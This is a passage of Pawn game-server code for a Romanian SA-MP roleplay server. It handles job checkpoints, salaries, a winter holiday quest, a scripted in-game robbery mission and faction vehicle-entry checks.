			SetPlayerCheckpoint(playerid, gNewTruckerCP[x][y][0], gNewTruckerCP[x][y][1], gNewTruckerCP[x][y][2], 5.0);
			CP[playerid] = 60;
			GiveJobSalary(playerid, PlayerInfo[playerid][pJobSkill][PlayerInfo[playerid][pJob]]*RandomEx(50000, 70000), 150);
		}
		case 306: CP[playerid] = 299, SetPlayerCheckpoint(playerid, 1872.9749,-1405.3937,14.0581, 2.0);
		case 328: {
			GiveJobSalary(playerid, RandomEx(20000, 30000), 100);
			stopWork(playerid, 69);
		}
		case 701: SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job){FFFFFF} Foloseste tasta 'ALT' in apropierea unui copac pentru a-l taia."), DisablePlayerCheckpoint(playerid), CP[playerid] = 0;
		case 702: {
			if(!IsPlayerInVehicle(playerid, JobVehicle[playerid]))
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job.");

			#if defined QUEST_WINTER
				if(!total_quests[playerid] && quest_started[playerid]) {
					++temp_progress[playerid];
					if(temp_progress[playerid]>=3) {
						temp_progress[playerid] = 0;
						++total_quests[playerid];
						SendClientMessage(playerid, COLOR_LGREEN, "Winter Quest: {FFFFFF}Ai terminat progress-ul la acest job! du-te la urmatoarea sarcina!");
						SendClientMessage(playerid, COLOR_YELLOW, "Du-te la curier si colecteaza cadoruile pentru Mos Craciun!");
						UpdateVar(playerid, "QuestProgress", 1);
					} else SCMf(playerid, COLOR_LGREEN, "Winter Quest: {FFFFFF}Trebuie sa mai faci %d ture la acest job!", 3-temp_progress[playerid]);
				}
			#endif
			GiveJobSalary(playerid, RandomEx(20000, 25000), 120);
			SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Daca vrei sa continui sa muncesti du-te la checkpoint-ul setat iar daca nu foloseste (/stopwork).");
			SetPlayerCheckpoint(playerid, -651.0809,-1596.1952,24.0171, 6.0);
			CP[playerid] = 701;
			CurseFacute[playerid] = 0;
			for(new i=0;i<6;i++) DestroyDynamicObject(LumberObj[playerid][i]);
			for(new i=0,j=sizeof g_Tree;i<j;i++) {
				if(TreeObj[playerid][i]) continue;
				
				TreeObj[playerid][i] = CreateDynamicObject(660, g_Tree[i][0], g_Tree[i][1], g_Tree[i][2],   0.00000, 0.00000, 0.00000, 0, 0, playerid, 300.00);
			}
		}
		case 705: {
			DisablePlayerCheckpoint(playerid);
			CheckMission(playerid, 17);
			CP[playerid] = 0;
			CurseFacute[playerid] = RandomEx(4000, 5000);
			format(gString, 128, "Option\tAmount\nDoresc materiale pentru mine\t%d\nDoresc sa vand materialele\t$%s", CurseFacute[playerid], FormatNumber(CurseFacute[playerid]*10));
			ShowPlayerDialog(playerid, DIALOG_MATERIALS1, DIALOG_STYLE_TABLIST_HEADERS, "Arms Dealer", gString, "Select", "Cancel");
		}
		case 706: {
			showInfo(playerid, "Apasa ~r~F ~w~~h~pentru a intra in aceasta cladire.~n~trebuie sa apesi tasta ~r~y ~w~~h~la acea persoana pentru a procesa iarba.");
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 707: {
			if(JobVehicle[playerid]!=GetPlayerVehicleID(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job.");
			SendClientMessage(playerid, COLOR_YELLOW, "Ai luat piatra! Du-te langa partenerul tau si apasa tasta Y.");
			InHand[playerid] = true;
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 708: {
			if(JobVehicle[playerid]!=GetPlayerVehicleID(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job.");
			SendClientMessage(playerid, COLOR_YELLOW, "Piatra descarcata! Du-te la checkpoint pentru a incarca alta de la prieten-ul tau.");
			InHand[playerid] = false;
			SetPlayerCheckpoint(playerid, 851.4480,864.1439,14.8763, 5.0);
			CP[playerid] = 709;
			new m = RandomEx(50000, 60000);
			GiveJobSalary(playerid, m, 120);
			if(jobWork[playerid]!=-1) GiveJobSalary(jobWork[playerid], m, 120);
		}
		case 709: {
			SendClientMessage(playerid, COLOR_YELLOW, "Asteapta pana parteneru tau aduce movila!");
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 710: {
			if(!IsPlayerInVehicle(playerid, JobVehicle[playerid]))
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job.");

			GiveJobSalary(playerid, RandomEx(25000, 35000));
			CheckMission(playerid, 1);
			new h = random(sql_houses);
			SetPlayerCheckpoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 5.0);
			CP[playerid] = 710;
			format(gString, 128, "du-te la punctul ~r~~h~rosu ~w~~h~de pe mapa pentru a livra pizza.~n~distanta: %.1fm.", GetPlayerDistanceFromPoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]));
			showInfo(playerid, gString, 10);
		}
		case 711: {
			if(JobVehicle[playerid]!=GetPlayerVehicleID(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job.");
			showInfo(playerid, "~y~Loading...~n~~w~~h~please wait!", 7);
			TogglePlayerControllable(playerid, false);
			SetTimerEx("loadingCourier", 7000, false, "i", playerid);
			DisablePlayerCheckpointEx(playerid);
			CP[playerid] = 0;
			CurseFacute[playerid] = 0;
			MoneyEarned[playerid] = 0;	
		}
		case 712: {
			if(IsPlayerInVehicle(playerid, JobVehicle[playerid])) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti livra coletul dintr-un vehicul!");
			
			if(!InHand[playerid]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai coletul! Pentru a-l lua, du-te in spatele vehiculului si apasa Y.");
			

			#if defined QUEST_WINTER 
				if(total_quests[playerid] == 1 && quest_started[playerid]) {
					++temp_progress[playerid];
					if(temp_progress[playerid] >= 5) {
						++total_quests[playerid];
						temp_progress[playerid] = 0;
						UpdateVar(playerid, "QuestProgress", total_quests[playerid]);
						SendClientMessage(playerid, COLOR_LGREEN, "Winter Quest: {FFFFFF}Ai colectat toate cadoruile! acum du-te la Forklift pentru a colecta materialele!");
					} else SCMf(playerid, COLOR_LGREEN, "Winter Quest: {FFFFFF}Ai colectat %d cadorui pana acum mai ai de colectat %d!", temp_progress[playerid], 5-temp_progress[playerid]);
				}
			#endif

			InHand[playerid] = false;
			new j = random(sql_houses)+1;
			SetPlayerCheckpoint(playerid, HouseInfo[j][hEntrancex],HouseInfo[j][hEntrancey],HouseInfo[j][hEntrancez], 7.0);
			CP[playerid] = 712;
			format(gString, 128, "Du-te la punctul ~r~~h~rosu~w~~h~ de pe mapa pentru a livra coletul.~n~Pentru a lua coletul, apasa tasta Y in spatele vehiculului!~n~Distanta: ~y~%0.1fm.", GetPlayerDistanceFromPoint(playerid, HouseInfo[j][hEntrancex],HouseInfo[j][hEntrancey],HouseInfo[j][hEntrancez]));
			CheckMission(playerid, 36);
			showInfo(playerid, gString, 7);	
			GiveJobSalary(playerid, RandomEx(30000, 40000));
			RemovePlayerAttachedObject(playerid, 1);
			SetPlayerSpecialAction(playerid, 0);
		}
		case 713: {
			if(JobVehicle[playerid]!=GetPlayerVehicleID(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job.");
			CP[playerid] ++;
			showInfo(playerid, "Du-te la ~r~~h~checkpoint-ul~w~~h~ de pe mapa pentru a descarca marfa!", 7);	
			SetPlayerCheckpoint(playerid, 966.6690,2160.6372,10.8203, 2.0);	
		}
		case 714: {
			if(JobVehicle[playerid]!=GetPlayerVehicleID(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job.");
			CP[playerid] --;	
			switch(random(2)) {
				case 0: SetPlayerCheckpoint(playerid,928.6621,2070.4258,10.5839,2.0); 
				case 1: SetPlayerCheckpoint(playerid,1053.6273,2134.8035,10.5866,2.0); 
			}
			CheckMission(playerid, 35);
			showInfo(playerid, "Du-te la ~r~~h~checkpoint-ul~w~~h~ de pe mapa pentru a lua marfa!", 7);		
			GiveJobSalary(playerid, RandomEx(2000, 3000), 10);

			#if defined QUEST_WINTER 
				if(total_quests[playerid] == 2 && quest_started[playerid]) {
					++temp_progress[playerid];
					if(temp_progress[playerid] >= 15) {
						++total_quests[playerid];
						temp_progress[playerid] = 0;
						UpdateVar(playerid, "QuestProgress", total_quests[playerid]);
						SendClientMessage(playerid, COLOR_LGREEN, "Winter Quest: {FFFFFF}Ai colecatat toate materialele! Acum du-te la checkpoint pentru a-l ajuta pe Mos Craciun.");
						SetPlayerCheckpoint(playerid, 2788.5872,-2417.5374,13.6335, 5.0);
						CP[playerid] = 869;
					} else SCMf(playerid, COLOR_LGREEN, "Winter Quest: {FFFFFF}Ai colectat %d materiale mai ai de colectat %d!", temp_progress[playerid], 15-temp_progress[playerid]);
				}
			#endif
		}
		#if defined QUEST_WINTER
		case 869: {
			SCMf(playerid, COLOR_YELLOW, "Felicitari %s! Ai terminat quest-ul special de iarna!", GetName(playerid));
			new m=RandomEx(2000000, 12000000),gp=RandomEx(150,250),pp=RandomEx(1,5),dp=RandomEx(100, 400), rp=RandomEx(1,4);
			givePoints(playerid, dp, gp);
			PlayerInfo[playerid][pPremiumPoints] += pp;
			UpdateVar(playerid, "PremiumPoints", PlayerInfo[playerid][pPremiumPoints]);
			PlayerInfo[playerid][pExp] += rp;
			UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
			GivePlayerCash(playerid, m);
			SCMf(playerid, COLOR_YELLOW, "Mos Craciun te-a premiat cu: $%s, %d gift points, %d premium points, %d Dark Points si %d Respect Points", FormatNumber(m), gp, pp, dp, rp);
			format(gString, sizeof gString, "(( {3ED7DA}Winter Quest{5F9CC9}: %s a terminat quest-ul special de iarna si a primit un premiu special! ))");
			SendClientMessageToAll(COLOR_SERVER, gString);
		}
		#endif
		case 715: {
			if(IsPlayerInAnyVehicle(playerid))
				return true;

			new i = BagTime[playerid];
			switch(BizzInfo[i][bType]) {
			 	case 4: LumberObj[playerid][0] = CreatePlayerObject(playerid, 1220, -783.31848, 499.14713, 1371.79370, 0.0, 0.0, 0.0, 300.0), SetPlayerCheckpoint(playerid, -783.2789,500.0741,1371.7422, 1.0);
			 	case 19: LumberObj[playerid][0] = CreatePlayerObject(playerid, 1582, 373.71121, -118.08469, 1001.52063, 0.0, 0.0, 0.0, 300.0), SetPlayerCheckpoint(playerid, 373.72394,-119.01875,1001.49115, 1.0);
			 	case 8: LumberObj[playerid][0] = CreatePlayerObject(playerid, 19811, 375.66708, -66.71098, 1001.57910, 0.0, 0.0, 0.0, 300.0), SetPlayerCheckpoint(playerid, 375.65060,-67.51511,1001.45819, 1.0);
			}
			SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
			SetPlayerPos(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
			SetPlayerVirtualWorld(playerid,BizzInfo[i][bVirtual]);
			SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Glovo Job) {FFFFFF}Mergi la checkpoint-ul pentru a lua mancarea de pe masa.");
			CP[playerid] = 716;
		}
		case 716: {
			switch(BizzInfo[BagTime[playerid]][bType]) {
				case 4: SetPlayerAttachedObject(playerid, 4, 1220, 1, 0.2270, 0.4790, -0.0170, 0.0000, -92.4999, 0.0000, 1.0000, 0.7830, 0.6720);
				case 19: SetPlayerAttachedObject(playerid, 4, 1582, 1, 0.0000, 0.5090, -0.0020, 0.0000, 91.8999, 0.0000, 1.0000, 1.0000, 1.0000);
				case 8: SetPlayerAttachedObject(playerid, 4, 19811, 1, 0.0150, 0.4600, -0.0639, 0.0000, 93.6999, 0.0000, 1.2970, 1.1950, 1.0000);
			}
			InHand[playerid] = true;
			DestroyPlayerObject(playerid, LumberObj[playerid][0]), LumberObj[playerid][0] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Glovo Job) {FFFFFF}Pune mancarea in rucsac apasand tasta 'Y'.");
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
			ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
			CP[playerid] = 0;
			DisablePlayerCheckpoint(playerid);
			InInterior[playerid] = BUSINESS_INTERIOR;
			InInteriorID[playerid] = BagTime[playerid];
		}
		case 717: {
			if(!InHand[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Glovo Job) {FFFFFF}Nu ai mancarea in mana, apasa tasta 'Y' pentru a o lua din rucsac!");
			RemovePlayerAttachedObject(playerid, 4); InHand[playerid] = false;
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			GiveJobSalary(playerid, RandomEx(160000, 200000));
			new const bizz_type[3] = {3, 7, 18};
			new t=random(6969)%sizeof bizz_type, biz = BizzTypeID[bizz_type[t]][random(GpsBizzType[bizz_type[t]])];
			SCMf(playerid, COLOR_WHITE, "{75db3d}(Glovo Job) {FFFFFF}Mergi la afacerea #%d (tip: %s) pentru a lua mancarea. Distanta: %.1fm.", BizzInfo[biz][bID], BizzName[bizz_type[t]], GetPlayerDistanceFromPoint(playerid, BizzInfo[biz][bEntranceX], BizzInfo[biz][bEntranceY], BizzInfo[biz][bEntranceZ]));
			SetPlayerCheckpoint(playerid, BizzInfo[biz][bEntranceX], BizzInfo[biz][bEntranceY], BizzInfo[biz][bEntranceZ], 3.0);
			BagTime[playerid] = biz;
			CP[playerid] = 715;
			UpdateJobStats(playerid);
		}
		case 718: {
			if(IsPlayerInAnyVehicle(playerid)) return true;
			GameTextForPlayer(playerid,"~n~~n~~n~~n~~n~~n~~n~~n~~y~~h~please wait!~n~~w~~h~milking...", 2000, 3);
			OnePlayAnim(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
			SetTimerEx("close_milk", 3000, false, "i", playerid);
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 719: {
			if(GetPlayerVehicleID(playerid)!=JobVehicle[playerid])
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job!");

			GiveJobSalary(playerid, RandomEx(60000, 70000), 100);
			CurseFacute[playerid] = 0;
			new r = random(sizeof vaca_cp);
			SetPlayerCheckpoint(playerid, vaca_cp[r][0], vaca_cp[r][1], vaca_cp[r][2], 2.0);
			SCMf(playerid, COLOR_WHITE, "{75db3d}(Farmer Job) {FFFFFF}Distanta pana la urmatoarea vaca: %.1fm.", GetPlayerDistanceFromPoint(playerid, vaca_cp[r][0], vaca_cp[r][1], vaca_cp[r][2]));
			CP[playerid] = 718;
		}
		case 720: {
			if(IsPlayerInAnyVehicle(playerid))
				return true;


			SetPlayerAttachedObject(playerid, 4, 3931, 6, 0.4200, 0.1710, -0.1630, 150.5000, 0.0000, 113.7999, 1.0000, 1.0000, 1.0000);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
			ApplyAnimation(playerid, "CARRY", "liftup05", 4.1, 0, 1, 1, 0, 0);
			new obj = MoneyEarned[playerid];
			if(_stoneObj[playerid][obj]!=INVALID_OBJECT_ID) DestroyDynamicObject( _stoneObj[playerid][obj]), _stoneObj[playerid][obj]=INVALID_OBJECT_ID;
			if(!CurseFacute[playerid]) SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Trucker Job) {FFFFFF}Pune piatra in vehiculul de la job apasand tasta 'Y'.");
			CP[playerid] = 0;
			DisablePlayerCheckpoint(playerid);
			InHand[playerid]  = true;
		}
		case 721: {
			if(GetPlayerVehicleID(playerid)!=JobVehicle[playerid])
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul de la job!");

			GiveJobSalary(playerid, RandomEx(900000, 1000000), 300);
			for(new i=0,j=sizeof stone_object;i!=j;i++) {
				if(_stoneObj[playerid][i]!=INVALID_OBJECT_ID) continue;
				_stoneObj[playerid][i] = CreateDynamicObject(3931, stone_object[i][0], stone_object[i][1], stone_object[i][2], 0.0, 0.0, 0.0, 0, 0, playerid, 300.0);
			}
			CurseFacute[playerid] = 0;
			new r = MoneyEarned[playerid] = random(sizeof stone_object);
			SetPlayerCheckpoint(playerid, stone_object[r][0], stone_object[r][1], stone_object[r][2], 2.0);
			SCMf(playerid, COLOR_WHITE, "{75db3d}(Trucker Job) {FFFFFF}Distanta pana la urmatoarea piatra: %.1fm.", GetPlayerDistanceFromPoint(playerid, stone_object[r][0], stone_object[r][1], stone_object[r][2]));
			CP[playerid] = 720;
		}
		case 722: return true;
		case 723: {
			stopWork(playerid, 69);
			SendClientMessage(playerid, -1, "Pentru a vinde pestele mergi la un magazin 24/7 (/gps).");
			switch(PlayerInfo[playerid][pJob]) {
				case 11: {
					SetPlayerPos(playerid, 2350.5281,524.4094,1.7969);
					SetPlayerFacingAngle(playerid, 336.1907);
				}
				case 13: {
					SetPlayerPos(playerid, 397.9346,-2084.7786,7.8301);
					SetPlayerFacingAngle(playerid, 53.0373);
				}
				case 16: {
					SetPlayerPos(playerid, -2976.4229,503.8421,2.4297);
					SetPlayerFacingAngle(playerid, 188.7119);
				}
			}
		}
		case 725: {
			if(player_selected[playerid]) return true;
			SetPlayerCameraPos(playerid, 375.804168, -115.098312, 1004.069519);
			SetPlayerCameraLookAt(playerid, 375.783020, -111.562843, 1000.533996);
			SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Pizza Job) {FFFFFF}Pune ingredientele de pe lista pentru a face pizza.");
			for(new i=0;i<6;i++) TextDrawShowForPlayer(playerid, PizzaTD[i]);
			PlayerTextDrawSetString(playerid, PizzaPTD, "- x1 bacon~n~- x2 felii salam~n~- x2 felii cascaval~n~- x1 ketchup~n~- x0 maioneza");
			PlayerTextDrawShow(playerid, PizzaPTD);
			SelectTextDraw(playerid, 0xFFFFFF70);
			player_selected[playerid] = 18;
			CP[playerid] = 0;
			DisablePlayerCheckpoint(playerid);
			pizzaProgress[playerid][0] = pizzaProgress[playerid][3] = 1;
			pizzaProgress[playerid][1] = pizzaProgress[playerid][2] = 2;
		}
		case 724: {
			InHand[playerid] = false;
			RemovePlayerAttachedObject(playerid, 5);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			new r = random(sql_houses/2);
			SetPlayerCheckpoint(playerid, HouseInfo[r][hEntrancex], HouseInfo[r][hEntrancey], HouseInfo[r][hEntrancez], 5.0);
			CP[playerid] = 726;
			SCMf(playerid, COLOR_WHITE, "{75db3d}(Pizza Job) {FFFFFF}Du-te la punctul rosu de pe mapa pentru a livra pizza. Distanta: %.1fm.", GetPlayerDistanceFromPoint(playerid, HouseInfo[r][hEntrancex], HouseInfo[r][hEntrancey], HouseInfo[r][hEntrancez]));
		}
		case 726: {
			if(!InHand[playerid]) return true;
			GiveJobSalary(playerid, RandomEx(40000, 45000));
			CheckMission(playerid, 1);
			InHand[playerid] = false;
			RemovePlayerAttachedObject(playerid, 5);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Pizza Job) {FFFFFF}Mergi la checkpoint pentru a face alta pizza!");
			SetPlayerCheckpoint(playerid, 2638.6838,1849.8210,11.0234, 1.0);
			CP[playerid] = 53;
		}
		case 730: {
			SetTimerEx(#showRob, 6000, false, #i, playerid);
			format(gString, 60, "~y~Wembley (69): ~w~~h~Salut, %s!", GetName(playerid));
			PlayerTextDrawSetString(playerid, RobTD, gString);
			PlayerTextDrawShow(playerid, RobTD);
			TogglePlayerControllable(playerid, false);
			p_rob[playerid][r_in_rob] = true;
			PlayerInfo[playerid][pRob] -= 8;
			UpdateVar(playerid, "Rob", PlayerInfo[playerid][pRob]);
			p_rob[playerid][r_time] = 0;
			p_rob[playerid][r_time_left] = gettime();
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 731: {
			SendClientMessage(playerid, COLOR_WHITE, "Intra in acest business si sparge mai intai camerele pentru siguranta ta iar apoi apasa tasta 'C' langa seif pentru a lua sacii");
			SendClientMessage(playerid, COLOR_WHITE, "... cu bani.");
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 733: {
			if(GetPlayerVehicleID(playerid)!=p_rob[playerid][r_vehicle]) return true;
			new t = gettime()-p_rob[playerid][r_time_left], amount = RandomEx(2000000, 2500000);
			SCMf(playerid, COLOR_WHITE, "{47A028}(Rob) {ffffff}Jaful a fost terminat cu success in %02d:%02d si ai primit $%s.", t/60, t%60, FormatNumber(amount));
			GivePlayerCash(playerid, amount);
			new id;
			if((id=p_rob[playerid][r_coPlayer])!=-1) {
				t = gettime()-p_rob[id][r_time_left];
				SCMf(id, COLOR_WHITE, "{47A028}(Rob) {ffffff}Jaful a fost terminat cu success in %02d:%02d si ai primit $%s.", t/60, t%60, FormatNumber(amount));
				GivePlayerCash(id, amount);
				p_rob[playerid][r_coPlayer] = -1;
				p_rob[id][r_coPlayer] = -1;
				stop_rob(id, 3);
			}
			stop_rob(playerid, 3);
		}
		case 800: {
			if(IsPlayerInAnyVehicle(playerid)) return true;
			GameTextForPlayer(playerid,"~n~~n~~n~~n~~n~~n~~n~~n~~y~~h~please wait!~n~~w~~h~milking...", 2000, 3);
			OnePlayAnim(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
			SetTimerEx("close_milk_quest", 3000, false, "i", playerid);
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 801: {
			DisablePlayerCheckpoint(playerid);
			cout::(playerid, -1, "{75db3d}(Job) {FFFFFF}Ai descarcat cu succes incarcatura. Du-te in fabrica pentru a incarca mobilierul in vehicul si a livra mobila la magazine.");
			CurseFacute[playerid] = 0;
			for(new i; i < 6; i++) DestroyDynamicObject(LumberObj[playerid][i]);
			//LumberObj[playerid][0] = CreateDynamicObject(1463, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
			//if(LumberObj[playerid][0]!=INVALID_OBJECT_ID) continue;
			LumberObj[playerid][0] = CreateDynamicObject(2133, 942.322449, 2118.569580, 1011.119141, 0.000000, 0.000000, 0.000000, -1, -1, -1, 400.000000, 400.000000);
			BlockEnter[playerid] = false;
		}
		case 802: {
			if(StatusJob[playerid]==1) {
				//if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti face asta dintr-un vehicul.");
				showInfo(playerid, "Apasa tasta ~y~Y ~w~langa vehicul pentru a lua mobila iar apoi pune-o in checkpoint.", 6);
				CurseFacute[playerid] = 1;
			}
		}
		case 3000: {
			DisablePlayerCheckpoint(playerid);
			switch(temp_work[playerid]) {
				case 1: {
					ClearAnimations(playerid);
					SetPlayerAttachedObject( playerid, 9, 1463, 1, 0.187385, 0.559032, -0.002791, 93.806076, 91.723266, 0.000000, 0.442207, 1.000000, 0.799356 );
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);

				 	SetPlayerCheckpoint(playerid, 39.0891,2485.9106,16.4916, 1.0);		
					CP[playerid] = 3001;
				}
				case 2: {
					ClearAnimations(playerid);
					SetPlayerAttachedObject( playerid, 9, 2814, 1, -0.045141, 0.474946, 0.000000, 0.000000, 78.889976, 0.000000, 1.000000, 1.000000, 1.000000 );
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);

					random_checkpoint(playerid);
					CP[playerid] = 3001;
				}
			}	
		}

		case 3001: {
			DisablePlayerCheckpoint(playerid);
			ClearAnimations(playerid);
			RemovePlayerAttachedObject(playerid, 9);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);

			switch(temp_work[playerid]) {
				case 1: {
					new 
						time = 10 + random(10), 
						money = RandomEx(50, 100);

					PlayerInfo[playerid][pJailTime] -= time;				
					format(gString, 60, "~r~-%d seconds.~n~+$%d", time, money);
					GameTextForPlayer(playerid, gString, 2000, 4);
					GivePlayerCash(playerid, money);
					random_checkpoint(playerid);
				}
				case 2: {
					new 
						time = 5 + random(2), 
						money = RandomEx(10, 100);

					PlayerInfo[playerid][pJailTime] -= time;
					format(gString, 60, "~r~-%d seconds.~n~+$%d", time, money);
					GameTextForPlayer(playerid, gString, 2000, 4);			
					GivePlayerCash(playerid, money);
					SetPlayerCheckpoint(playerid, 369.6979,-6.0192,1001.8589, 1.0);
					CP[playerid] = 3000;
				}
			}
		}	
	}
	PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);	
	return true;
}

redist::showRob(playerid) {
	new _x = p_rob[playerid][r_actor]; 
	p_rob[playerid][r_time]++;
	switch p_rob[playerid][r_time] do {
		case 1: {
			PlayerTextDrawSetString(playerid, RobTD, "~y~Wembley (69): ~w~~h~Ti-am pus la dispozitie un vehicul de tip Burrito~n~~w~~h~si 2 arme (m4 & Deagle).");
			SetTimerEx(#showRob, 6000, false, #i, playerid);

			ServerWeapon(playerid, 31, 300);
			ServerWeapon(playerid, 24, 50);
		}
		case 2: {
			format(gString, 180, "~y~Wembley (69): ~w~~h~Trebuie sa Jefuieste afacerea de tip '%s' detinuta~n~~w~~h~de %s", BizzName[p_rob[playerid][r_biz_type]], BizzInfo[p_rob[playerid][r_biz_id]][bOwner]);
			PlayerTextDrawSetString(playerid, RobTD, gString);
			SetTimerEx(#showRob, 6000, false, #i, playerid);
		}
		case 3: {
			PlayerTextDrawSetString(playerid, RobTD, "~y~Wembley (69): ~w~~h~Ai forarte mare girja sa distrugi camerele si sa~n~~w~~h~Jefuiesti cei 2 saci din seif si sa-i aduci inapoi pentru a primi~n~~w~~h~recompensa.");
			SetTimerEx(#showRob, 6000, false, #i, playerid);
		}
		case 4: {
			PlayerTextDrawHide(playerid, RobTD);
			TogglePlayerControllable(playerid, true);
			new id = p_rob[playerid][r_biz_id];
			SetPlayerCheckpoint(playerid, BizzInfo[id][bEntranceX], BizzInfo[id][bEntranceY], BizzInfo[id][bEntranceZ], 1.0);
			CP[playerid] = 731;

			if(p_rob[playerid][r_role]&&p_rob[playerid][r_coPlayer]!=-1) return true;

			new const
    			Float: rob_veh_pos[][] = {

				{258.9473,2904.7476,7.2277,126.5752},
				{-640.4951,1444.0969,13.7371,38.7312},
				{709.4750,1203.4810,13.4697,264.4100},
				{-511.6223,-549.5803,25.6468,266.2320},
				{-371.2375,2221.9299,42.6053,182.6918},
				{-1442.0195,-1535.6364,101.8759,358.7169}
			};
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
			p_rob[playerid][r_vehicle] = CreateVehicleEx(482, rob_veh_pos[_x][0], rob_veh_pos[_x][1], rob_veh_pos[_x][2], rob_veh_pos[_x][3], random(255), random(255));
			vehiclePlayerID[p_rob[playerid][r_vehicle]] = playerid;
			PutPlayerInVehicleEx(playerid, p_rob[playerid][r_vehicle], 0);
		}
	}
	return true;
}

redist::close_milk(playerid) {
	SetPlayerAttachedObject(playerid, 4, 19570, 6, 0.0729, 0.0780, -0.1110, 8.5000, 1.4000, 0.0000, 1.0000, 1.0000, 1.0000);
	InHand[playerid] = true;
	if(!CurseFacute[playerid]) SendClientMessage(playerid, -1, "{75db3d}(Farmer Job) {FFFFFF}Pune laptele in vehiculul de la job apasand tasta 'Y'.");
	return true;
}

redist::close_milk_quest(playerid) {
	new _r = random(sizeof vaca_cp);
	SetPlayerCheckpoint(playerid, vaca_cp[_r][0], vaca_cp[_r][1], vaca_cp[_r][2], 2.0);
	CP[playerid] = 800;
	return true;
}

random_checkpoint(playerid) {
	new 
		rand = random(3);

	switch(temp_work[playerid]) {
		case 1: {
			switch(rand) {
				case 0: SetPlayerCheckpoint(playerid, -22.5337,2482.1072,16.4916, 1.0);
				case 1,2: SetPlayerCheckpoint(playerid, -33.3702,2486.5608,16.4916, 1.0);  
			}
		}
		case 2: {
			switch(rand) {
				case 0: SetPlayerCheckpoint(playerid, 380.2409,-8.2350,1001.8516, 1.0);
				case 1: SetPlayerCheckpoint(playerid, 380.3008,-9.1058,1001.8516, 1.0);
				case 2: SetPlayerCheckpoint(playerid, 377.5910,-9.1555,1001.8516, 1.0);
			}

		}
	}
	
	CP[playerid] = 3000;
	return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger) {
	enterVehicle[playerid] = true;
	if(!ispassenger) {
		if(ServerVehicles[vehicleid][vFaction]) {
			switch(ServerVehicles[vehicleid][vFaction]) {
				case 1,2,3,14,19: if(!IsACop(playerid)) return SendErrorMsg(playerid, "Nu faci parte din factiunea %s.", FactionName(ServerVehicles[vehicleid][vFaction])), SlapPlayer(playerid);		
				default: {
					if(ServerVehicles[vehicleid][vFaction]!=PlayerInfo[playerid][pMember]) return SendErrorMsg(playerid, "Nu faci parte din factiunea %s.", FactionName(ServerVehicles[vehicleid][vFaction])), SlapPlayer(playerid);	
					if(!OnDuty[playerid] && IsACop(playerid)) return SendErrorMsg(playerid, "Nu poti folosi vehiculele factiunii daca nu esti la datorie!"), SlapPlayer(playerid);
					if(ServerVehicles[vehicleid][vRank] > PlayerInfo[playerid][pRank]) return SendErrorMsg(playerid, "Ai nevoie de rank %d pentru a lua acest vehicul.", ServerVehicles[vehicleid][vRank]), SlapPlayer(playerid);
				}
			}
		}
		if(IsABoat(vehicleid) && InLesson[playerid] == -1 && !PlayerInfo[playerid][pBoatLic]) return SendErrorMsg(playerid, "Nu ai licenta de navigatie."), SlapPlayer(playerid);
		if(IsAPlane(GetVehicleModel(vehicleid)) && InLesson[playerid] == -1 && !PlayerInfo[playerid][pFlyLic]) return SendErrorMsg(playerid, "Nu ai licenta de zbor."), SlapPlayer(playerid);
